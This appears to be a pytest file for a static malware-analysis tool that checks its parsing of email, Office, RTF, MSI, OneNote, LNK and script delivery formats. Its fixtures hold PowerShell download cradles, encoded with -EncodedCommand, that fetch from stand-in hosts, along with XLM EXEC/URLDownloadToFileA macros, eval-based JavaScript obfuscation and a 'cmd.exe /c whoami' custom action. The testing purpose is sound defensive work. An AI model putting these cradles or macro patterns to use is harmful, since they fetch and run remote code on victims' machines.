"""Tests for bounded delivery-format and script analyzers."""

import base64
import io
import json
import struct
import zipfile

import pytest

from titan_decoder.core.analyzers.structured import (
    EmailAnalyzer,
    LnkAnalyzer,
    MsiAnalyzer,
    OneNoteAnalyzer,
    OfficeAnalyzer,
    OptionalArchiveAnalyzer,
    RtfAnalyzer,
    ScriptAnalyzer,
)
from titan_decoder.core.engine import TitanEngine
from titan_decoder.core.detection_rules import CorrelationRulesEngine
from titan_decoder.core.ioc_export import build_ioc_summary

from _cfb_fixtures import build_cfb


def test_email_extracts_body_and_attachment_without_execution():
    attachment = base64.b64encode(b"MZ-not-executed http://attachment.example/a")
    message = (
        b"From: sender@example.org\r\n"
        b"To: analyst@example.org\r\n"
        b"Subject: Invoice\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: multipart/mixed; boundary=x\r\n\r\n"
        b"--x\r\nContent-Type: text/plain\r\n\r\nSee http://body.example/\r\n"
        b"--x\r\nContent-Type: application/octet-stream\r\n"
        b"Content-Disposition: attachment; filename=invoice.exe\r\n"
        b"Content-Transfer-Encoding: base64\r\n\r\n" + attachment + b"\r\n--x--\r\n"
    )
    artifacts = EmailAnalyzer().analyze(message)
    names = {name for name, _ in artifacts}
    assert "email_summary.json" in names
    assert "email_body_1.txt" in names
    assert "email_invoice.exe" in names
    report = TitanEngine().run_analysis(message)
    assert "http://attachment.example/a" in report["iocs"]["urls"]


def _ooxml() -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        )
        archive.writestr(
            "word/document.xml",
            "<document><p>Review http://document.example/path</p></document>",
        )
        archive.writestr(
            "word/_rels/document.xml.rels",
            '<Relationships><Relationship TargetMode="External" '
            'Target="https://template.example/payload.dotm"/></Relationships>',
        )
        archive.writestr("word/vbaProject.bin", b"VBA powershell -EncodedCommand")
        archive.writestr("word/embeddings/oleObject1.bin", b"MZ embedded object")
    return output.getvalue()


def _ooxml_formulas(formulas: list[str], *, macro_sheet: bool = True) -> bytes:
    output = io.BytesIO()
    member = "xl/macrosheets/sheet1.xml" if macro_sheet else "xl/worksheets/sheet1.xml"
    cells = "".join(
        f'<c r="A{index}"><f>{formula}</f><v>0</v></c>'
        for index, formula in enumerate(formulas, 1)
    )
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        )
        archive.writestr("xl/workbook.xml", "<workbook/>")
        archive.writestr(
            member, f"<worksheet><sheetData>{cells}</sheetData></worksheet>"
        )
    return output.getvalue()


def test_office_analyzer_reports_macros_relationships_and_embeddings():
    artifacts = OfficeAnalyzer().analyze(_ooxml())
    summary = json.loads(dict(artifacts)["office_summary.json"])
    assert summary["package_type"] == "word"
    assert summary["macro_present"] is True
    assert summary["embedded_objects"] == ["word/embeddings/oleObject1.bin"]
    assert summary["external_relationships"] == [
        "https://template.example/payload.dotm"
    ]
    report = TitanEngine().run_analysis(_ooxml())
    assert "https://template.example/payload.dotm" in report["iocs"]["urls"]


def test_office_analyzer_extracts_bounded_xlm_macro_formulas():
    data = _ooxml_formulas(
        [
            '=EXEC("calc.exe")',
            '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://xlm.example/a")',
        ]
    )
    artifacts = dict(OfficeAnalyzer().analyze(data))
    summary = json.loads(artifacts["office_summary.json"])
    assert summary["macro_present"] is True
    assert summary["xlm_macro_present"] is True
    assert summary["xlm_formula_count"] == 2
    assert summary["xlm_high_risk_functions"] == ["CALL", "EXEC"]
    assert summary["xlm_macro_sheets"] == ["xl/macrosheets/sheet1.xml"]
    assert b"EXEC" in artifacts["office_xlm_macros.txt"]
    assert b"http://xlm.example/a" in artifacts["office_xlm_macros.txt"]
    report = TitanEngine().run_analysis(data)
    assert "http://xlm.example/a" in report["iocs"]["urls"]


def test_xlm_precision_and_formula_count_bounds():
    ordinary = dict(OfficeAnalyzer().analyze(_ooxml_formulas(["=SUM(1,2)"])))
    summary = json.loads(ordinary["office_summary.json"])
    assert summary["xlm_macro_present"] is True
    assert summary["xlm_high_risk_functions"] == []

    worksheet = dict(
        OfficeAnalyzer().analyze(
            _ooxml_formulas(['=EXEC("not a macro sheet")'], macro_sheet=False)
        )
    )
    assert "office_xlm_macros.txt" not in worksheet
    assert json.loads(worksheet["office_summary.json"])["xlm_macro_present"] is False

    formulas = [f"=FORMULA({index})" for index in range(300)]
    bounded = dict(OfficeAnalyzer().analyze(_ooxml_formulas(formulas)))
    summary = json.loads(bounded["office_summary.json"])
    assert summary["xlm_formula_count"] == 256


def _rtf_with_object(payload: bytes) -> bytes:
    return (
        b"{\\rtf1\\ansi Invoice http://rtf.example/document\\par "
        b"{\\object\\objemb{\\*\\objclass Package}{\\*\\objdata "
        + payload.hex().encode("ascii")
        + b"}}}"
    )


def test_rtf_analyzer_extracts_text_and_embedded_payload_into_graph():
    payload = b"MZ-not-executed http://embedded.example/payload"
    data = _rtf_with_object(payload)
    analyzer = RtfAnalyzer()
    artifacts = dict(analyzer.analyze(data))
    summary = json.loads(artifacts["rtf_summary.json"])

    assert b"http://rtf.example/document" in artifacts["rtf_text.txt"]
    assert artifacts["rtf_object_001.exe"] == payload
    assert summary["object_classes"] == ["Package"]
    assert summary["active_content"]["embedded_executable"] is True
    assert summary["active_content"]["external_target"] is True
    assert summary["external_targets"] == ["http://rtf.example/document"]
    assert summary["object_types"] == ["exe"]
    assert summary["objects"][0]["stored"] is True
    assert summary["execution_performed"] is False

    report = TitanEngine().run_analysis(data)
    assert "http://rtf.example/document" in report["iocs"]["urls"]
    assert "http://embedded.example/payload" in report["iocs"]["urls"]
    object_nodes = [
        node
        for node in report["nodes"]
        if node.get("artifact_name") == "rtf_object_001.exe"
    ]
    assert object_nodes
    assert object_nodes[0]["parent"] == 0


def test_rtf_analyzer_supports_bin_data_without_treating_braces_as_groups():
    data = b"{\\rtf1{\\object{\\*\\objdata\\bin6 MZ{}\x00\x01}}}"
    artifacts = dict(RtfAnalyzer().analyze(data))
    summary = json.loads(artifacts["rtf_summary.json"])
    assert artifacts["rtf_object_001.exe"] == b"MZ{}\x00\x01"
    assert summary["balanced_groups"] is True


def test_rtf_analyzer_fails_closed_on_near_miss_and_malformed_groups():
    analyzer = RtfAnalyzer()
    assert analyzer.can_analyze(b"{\\rtfish ordinary prose}") is False
    malformed = b"{\\rtf1\\ansi text{\\object{\\*\\objdata 4d5a"
    artifacts = dict(analyzer.analyze(malformed))
    summary = json.loads(artifacts["rtf_summary.json"])
    assert summary["balanced_groups"] is False
    assert not any(name.startswith("rtf_object_") for name in artifacts)


def test_rtf_analyzer_enforces_scan_depth_and_artifact_size_bounds():
    deeply_nested = b"{\\rtf1 " + (b"{" * 300) + b"text" + (b"}" * 300) + b"}"
    summary = json.loads(dict(RtfAnalyzer().analyze(deeply_nested))["rtf_summary.json"])
    assert summary["depth_limited"] is True
    assert summary["maximum_group_depth"] == 256

    payload = b"MZ" + (b"A" * 4096)
    analyzer = RtfAnalyzer(
        {
            "max_structured_artifacts": 4,
            "max_structured_total_size": 16 * 1024,
            "max_structured_artifact_size": 1024,
        }
    )
    first = analyzer.analyze(_rtf_with_object(payload))
    second = analyzer.analyze(_rtf_with_object(payload))
    assert first == second
    object_payload = dict(first)["rtf_object_001.exe"]
    assert len(object_payload) == 1024


def _msi(strings: list[str], payload: bytes | None = None) -> bytes:
    encoded = [value.encode("cp1252") for value in strings]
    pool = struct.pack("<HH", 1252, 0) + b"".join(
        struct.pack("<HH", len(value), 1) for value in encoded
    )
    streams = [("_StringPool", pool), ("_StringData", b"".join(encoded))]
    if payload is not None:
        streams.append(("Binary/Updater", payload))
    return build_cfb(streams)


def _encoded_msi_stream_name(name: str, *, table: bool) -> str:
    alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz._"
    encoded = ["\u4840"] if table else []
    position = 0
    while position < len(name):
        first = alphabet.find(name[position])
        if first < 0:
            encoded.append(name[position])
            position += 1
            continue
        if position + 1 < len(name):
            second = alphabet.find(name[position + 1])
            if second >= 0:
                encoded.append(chr(0x3800 + first + (second << 6)))
                position += 2
                continue
        encoded.append(chr(0x4800 + first))
        position += 1
    return "".join(encoded)


def test_msi_analyzer_extracts_strings_and_embedded_payload_into_graph():
    payload = b"MZ-not-executed http://payload.msi.example/stage"
    data = _msi(["ProductName", "https://installer.example/update"], payload)
    analyzer = MsiAnalyzer()
    artifacts = dict(analyzer.analyze(data))
    summary = json.loads(artifacts["msi_summary.json"])

    assert analyzer.can_analyze(data) is True
    assert b"ProductName" in artifacts["msi_strings.txt"]
    assert artifacts["msi_payload_001.exe"] == payload
    assert summary["code_page"] == 1252
    assert summary["execution_performed"] is False
    assert summary["payloads"][0]["source_stream"] == "Binary/Updater"
    assert summary["payloads"][0]["type"] == "exe"
    assert summary["string_count"] == 2

    report = TitanEngine().run_analysis(data)
    assert "https://installer.example/update" in report["iocs"]["urls"]
    assert "http://payload.msi.example/stage" in report["iocs"]["urls"]
    assert any(node["method"] == "ANALYZE_MSI" for node in report["nodes"])


def test_msi_analyzer_decodes_real_stream_names_and_surfaces_execution_evidence():
    encoded = [value.encode("cp1252") for value in ["ProductName", "cmd.exe /c whoami"]]
    pool = struct.pack("<HH", 1252, 0) + b"".join(
        struct.pack("<HH", len(value), 1) for value in encoded
    )
    data = build_cfb(
        [
            (_encoded_msi_stream_name("_StringPool", table=True), pool),
            (_encoded_msi_stream_name("_StringData", table=True), b"".join(encoded)),
            (_encoded_msi_stream_name("CustomAction", table=True), b"table rows"),
            (
                _encoded_msi_stream_name("InstallExecuteSequence", table=True),
                b"sequence rows",
            ),
            (
                _encoded_msi_stream_name("Binary.Updater", table=False),
                b"MZ-not-executed https://payload.msi.example/stage",
            ),
        ]
    )

    artifacts = dict(MsiAnalyzer().analyze(data))
    summary = json.loads(artifacts["msi_summary.json"])

    assert summary["decoded_stream_names"] == [
        "Binary.Updater",
        "CustomAction",
        "InstallExecuteSequence",
        "_StringData",
        "_StringPool",
    ]
    assert summary["table_names"] == [
        "CustomAction",
        "InstallExecuteSequence",
        "_StringData",
        "_StringPool",
    ]
    assert summary["custom_action_evidence"] == {
        "binary_streams": ["Binary.Updater"],
        "command_strings": ["cmd.exe /c whoami"],
        "custom_action_table_present": True,
        "execution_surface_present": True,
        "sequence_tables": ["InstallExecuteSequence"],
    }
    assert summary["payloads"][0]["source_stream"] == "Binary.Updater"
    assert summary["payloads"][0]["source_stream_raw"] is not None
    assert artifacts["msi_payload_001.exe"].startswith(b"MZ-not-executed")

    report = TitanEngine().run_analysis(data)
    matches = CorrelationRulesEngine().evaluate_all(
        report, build_ioc_summary(report, None)
    )
    assert {match["rule_id"] for match in matches} >= {"TITAN-012"}


def test_msi_analyzer_fails_closed_and_enforces_deterministic_bounds():
    analyzer = MsiAnalyzer()
    assert analyzer.can_analyze(build_cfb([("Document", b"ordinary")])) is False
    assert analyzer.analyze(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1 malformed") == []

    bounded = MsiAnalyzer(
        {
            "max_structured_artifacts": 4,
            "max_structured_total_size": 16 * 1024,
            "max_structured_artifact_size": 1024,
        }
    )
    data = _msi([f"Property{index:04d}" for index in range(500)], b"MZ" + b"A" * 4096)
    first = bounded.analyze(data)
    second = bounded.analyze(data)
    assert first == second
    artifacts = dict(first)
    assert len(artifacts["msi_payload_001.exe"]) == 1024
    assert len(artifacts["msi_strings.txt"]) <= 1024


def _onenote(payloads: list[bytes], *, corrupt_reserved: bool = False) -> bytes:
    header = bytearray(1024)
    header[:16] = OneNoteAnalyzer._FILE_TYPE
    header[48:64] = OneNoteAnalyzer._REVISION_FORMAT
    output = bytearray(header)
    for payload in payloads:
        reserved = b"\x00" * 12
        if corrupt_reserved:
            reserved = b"\x01" + reserved[1:]
        output += OneNoteAnalyzer._OBJECT_HEADER
        output += struct.pack("<Q", len(payload))
        output += reserved
        output += payload
        output += b"\x00" * (-(52 + len(payload)) % 8)
        output += OneNoteAnalyzer._OBJECT_FOOTER
    return bytes(output)


def test_onenote_analyzer_recovers_documented_embedded_file_objects():
    payload = b"MZ-not-executed https://embedded.one.example/stage"
    data = _onenote([payload])
    artifacts = dict(OneNoteAnalyzer().analyze(data))
    summary = json.loads(artifacts["onenote_summary.json"])

    assert artifacts["onenote_file_001.exe"] == payload
    assert summary["embedded_file_count"] == 1
    assert summary["embedded_files"][0]["type"] == "exe"
    assert summary["execution_performed"] is False
    assert summary["file_format"] == "revision"

    report = TitanEngine().run_analysis(data)
    assert "https://embedded.one.example/stage" in report["iocs"]["urls"]
    assert any(node["method"] == "ANALYZE_OneNote" for node in report["nodes"])


def test_onenote_analyzer_fails_closed_and_obeys_object_bounds():
    analyzer = OneNoteAnalyzer()
    near_miss = bytearray(1024)
    near_miss[:16] = OneNoteAnalyzer._FILE_TYPE
    assert analyzer.can_analyze(bytes(near_miss)) is False
    malformed = dict(analyzer.analyze(_onenote([b"MZ bad"], corrupt_reserved=True)))
    assert "onenote_file_001.exe" not in malformed
    assert json.loads(malformed["onenote_summary.json"])["embedded_file_count"] == 0

    bounded = OneNoteAnalyzer(
        {
            "max_structured_artifacts": 4,
            "max_structured_total_size": 16 * 1024,
            "max_structured_artifact_size": 64,
        }
    )
    data = _onenote([b"MZ" + b"A" * 128, b"PK\x03\x04 small"])
    first = bounded.analyze(data)
    assert first == bounded.analyze(data)
    assert "onenote_file_001.zip" in dict(first)
    assert not any(name.endswith(".exe") for name, _ in first)


def test_script_analyzer_statically_deobfuscates_powershell_and_javascript():
    command = "IEX (iwr 'http://script.example/stage')"
    encoded = base64.b64encode(command.encode("utf-16-le"))
    script = b"powershell.exe -NoP -EncodedCommand " + encoded
    artifacts = dict(ScriptAnalyzer().analyze(script))
    assert b"http://script.example/stage" in artifacts["powershell_decoded.txt"]
    summary = json.loads(artifacts["script_summary.json"])
    assert "powershell" in summary["languages"]
    assert summary["execution_performed"] is False

    javascript = (
        b"function x(){eval(String.fromCharCode(104,116,116,112)+':%2f%2fjs.example')}"
    )
    artifacts = dict(ScriptAnalyzer().analyze(javascript))
    assert b"http://js.example" in artifacts["javascript_normalized.txt"]


def test_lnk_parser_recovers_target_strings():
    data = bytearray(76)
    data[:4] = b"L\x00\x00\x00"
    data[4:20] = bytes.fromhex("0114020000000000c000000000000046")
    struct.pack_into("<II", data, 20, 0x20, 0x80)
    struct.pack_into("<III", data, 52, 1234, 0, 1)
    data.extend(b"C:\\Users\\Public\\payload.exe\x00http://lnk.example/a\x00")
    artifacts = LnkAnalyzer().analyze(bytes(data))
    summary = json.loads(dict(artifacts)["lnk_metadata.json"])
    assert any("payload.exe" in value for value in summary["strings"])
    assert any("lnk.example" in value for value in summary["strings"])


def test_optional_archive_recognition_fails_closed_without_valid_payload():
    analyzer = OptionalArchiveAnalyzer()
    fake = b"7z\xbc\xaf'\x1c" + b"not a valid archive"
    assert analyzer.can_analyze(fake)
    assert analyzer.analyze(fake) == []
    fake_cab = b"MSCF" + b"not a valid cabinet"
    assert analyzer.can_analyze(fake_cab)
    assert analyzer.analyze(fake_cab) == []


def test_optional_7z_analyzer_extracts_with_current_py7zr_api():
    py7zr = pytest.importorskip("py7zr")
    payload = b"bounded 7z payload"
    output = io.BytesIO()
    with py7zr.SevenZipFile(output, mode="w") as archive:
        archive.writestr(payload, "nested/evidence.txt")

    data = output.getvalue()
    analyzer = OptionalArchiveAnalyzer()
    assert analyzer.can_analyze(data)
    assert dict(analyzer.analyze(data)) == {"evidence.txt": payload}


def test_optional_iso_analyzer_uses_complete_member_paths():
    pycdlib = pytest.importorskip("pycdlib")
    payload = b"bounded ISO payload"
    image = pycdlib.PyCdlib()
    image.new(interchange_level=3)
    image.add_fp(io.BytesIO(payload), len(payload), iso_path="/EVIDENCE.TXT;1")
    output = io.BytesIO()
    image.write_fp(output)
    image.close()

    data = output.getvalue()
    analyzer = OptionalArchiveAnalyzer()
    assert analyzer.can_analyze(data)
    assert dict(analyzer.analyze(data)) == {"EVIDENCE.TXT1": payload}


def test_optional_cab_analyzer_extracts_members():
    cabarchive = pytest.importorskip("cabarchive")
    payload = b"bounded CAB payload"
    archive = cabarchive.CabArchive()
    archive["evidence.txt"] = cabarchive.CabFile(payload)

    data = archive.save()
    analyzer = OptionalArchiveAnalyzer()
    assert analyzer.can_analyze(data)
    assert dict(analyzer.analyze(data)) == {"evidence.txt": payload}


def test_analyzer_metadata_artifacts_are_terminal_but_still_feed_iocs():
    command = (
        "IEX (New-Object Net.WebClient).DownloadString('http://meta.example/a.ps1')"
    )
    encoded = base64.b64encode(command.encode("utf-16-le"))
    script = b"powershell -nop -EncodedCommand " + encoded
    report = TitanEngine().run_analysis(script)
    nodes = report["nodes"]
    summaries = [
        node for node in nodes if node.get("artifact_name") == "script_summary.json"
    ]
    assert summaries
    summary = summaries[0]
    # The analyzer-authored summary is recorded but never fed back through
    # decoders or analyzers, so it stays a childless ANALYZE-terminal node.
    assert summary["method"] == "ANALYZE"
    assert summary["analysis_state"] == "terminal"
    assert "metadata" in summary["termination_reason"]
    assert all(node.get("parent") != summary["id"] for node in nodes)
    # Its preview still contributes to report-level IOC extraction.
    assert "http://meta.example/a.ps1" in report["iocs"]["urls"]


def test_email_attachment_cannot_shadow_the_summary_artifact():
    message = (
        b"From: sender@example.org\r\n"
        b"To: analyst@example.org\r\n"
        b"Subject: Shadow\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: multipart/mixed; boundary=x\r\n\r\n"
        b"--x\r\nContent-Type: application/octet-stream\r\n"
        b"Content-Disposition: attachment; filename=summary.json\r\n\r\n"
        b'{"not": "the analyzer summary"}\r\n--x--\r\n'
    )
    artifacts = EmailAnalyzer().analyze(message)
    names = [name for name, _ in artifacts]
    assert names.count("email_summary.json") == 1
    summary = json.loads(dict(artifacts)["email_summary.json"])
    assert summary["analyzer"] == "email"
    assert "email_summary_2.json" in names


def test_structured_analyzers_are_registered_deterministically():
    names = [analyzer.name for analyzer in TitanEngine().analyzers]
    assert names == sorted(names)
    assert {
        "Email",
        "MSI",
        "OfficeOOXML",
        "OneNote",
        "OptionalArchive",
        "RTF",
        "Script",
        "WindowsLNK",
    } <= set(names)
